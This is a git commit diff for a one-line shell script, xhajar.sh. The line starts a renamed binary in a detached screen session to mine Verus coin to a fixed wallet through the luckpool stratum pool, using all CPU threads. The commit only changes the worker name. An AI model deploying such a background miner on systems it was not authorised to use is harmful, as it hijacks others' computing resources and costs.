663c26086391fd22b2062128a666709a5e0cc53b
renilo <88342640+renilo@users.noreply.github.com>
2021-12-08 21:53:25 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -1,1 +1,1 @@
-screen -dmS Running ./manuk -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.$(echo $(shuf -i 1-3 -n 1)-ETETES) -p x -t $(nproc)
+screen -dmS Running ./manuk -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.$(echo $(shuf -i 1-3 -n 1)-ETETESA) -p x -t $(nproc)
